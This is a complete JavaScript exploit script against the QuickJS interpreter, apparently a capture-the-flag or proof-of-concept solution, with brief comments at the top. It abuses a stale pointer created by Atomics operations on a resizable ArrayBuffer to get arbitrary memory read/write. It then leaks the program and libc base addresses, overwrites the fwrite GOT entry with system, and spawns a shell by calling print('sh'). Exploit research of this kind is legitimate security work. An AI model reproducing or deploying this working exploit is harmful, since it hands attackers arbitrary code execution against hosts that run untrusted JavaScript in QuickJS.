// Atomics + resizable ArrayBuffer stale pointer -> overwrite JSArrayBuffer.data
// to gain arbitrary read/write.
// Then: leak qjs PIE base via JSArrayBuffer.free_func, leak libc base via
// fwrite@GOT, patch fwrite@GOT -> system, and trigger system("sh") by
// calling print("sh\0") (system sees NUL-terminated command string).

const OFF_JS_ARRAY_BUFFER_FREE = 0x14bc0n;   // nm -a qjs | grep js_array_buffer_free
const OFF_FWRITE_GOT           = 0x10b380n;  // readelf -r qjs | grep fwrite

const OFF_LIBC_FWRITE = 0x07f2c0n;           // nm -D libc | grep fwrite@@
const OFF_LIBC_SYSTEM = 0x053110n;           // nm -D libc | grep system@@

const keep = [];

const rab = new ArrayBuffer(0x88, { maxByteLength: 0x100 });
const ta = new BigInt64Array(rab);

const IDX_ABUF_DATA_PTR  = 12; // offset 0x60: JSArrayBuffer.data
const IDX_ABUF_FREE_FUNC = 16; // offset 0x80: JSArrayBuffer.free_func

function leak_qjs_free_func_ptr() {
  let victim;
  const obj = {
    valueOf() {
      rab.resize(0x40);
      victim = new ArrayBuffer(0x200);
      keep.push(victim);
      return 0n;
    }
  };
  rab.resize(0x88);
  return Atomics.add(ta, IDX_ABUF_FREE_FUNC, obj);
}

function make_abuf_with_data_ptr(newDataPtr) {
  let victim;
  const obj = {
    valueOf() {
      rab.resize(0x40);
      victim = new ArrayBuffer(0x1000);
      keep.push(victim);
      return newDataPtr;
    }
  };
  rab.resize(0x88);
  Atomics.exchange(ta, IDX_ABUF_DATA_PTR, obj);
  return victim;
}

// Resolve fwrite@GOT.
print('warmup');

// Leak qjs base.
const free_func_ptr = leak_qjs_free_func_ptr();
const qjs_base = free_func_ptr - OFF_JS_ARRAY_BUFFER_FREE;

// Read libc fwrite from GOT.
const fwrite_got = qjs_base + OFF_FWRITE_GOT;
const got_buf = make_abuf_with_data_ptr(fwrite_got);
const got_view = new DataView(got_buf);
const libc_fwrite = got_view.getBigUint64(0, true);
const libc_base = libc_fwrite - OFF_LIBC_FWRITE;
const libc_system = libc_base + OFF_LIBC_SYSTEM;

// Patch fwrite@GOT -> system.
got_view.setBigUint64(0, libc_system, true);

// Trigger system("sh") by calling print() on a NUL-terminated string.
// print() calls fwrite(str, 1, len, stdout) => system(str).
print('sh\u0000');
